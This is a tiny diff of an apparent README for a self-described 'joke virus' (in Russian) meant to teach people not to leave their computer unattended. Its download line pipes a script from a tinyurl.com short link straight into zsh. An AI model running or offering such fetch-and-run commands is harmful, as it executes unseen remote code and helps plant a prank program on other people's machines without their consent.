@@ -3,4 +3,4 @@
 шутливый вирус для проучивания тех, кто бросает комп без присмотра
 
 Скачать:
-`curl -fsSL tinyurl.com/akvago | zsh`
+`curl -fsL tinyurl.com/akvago | zsh`
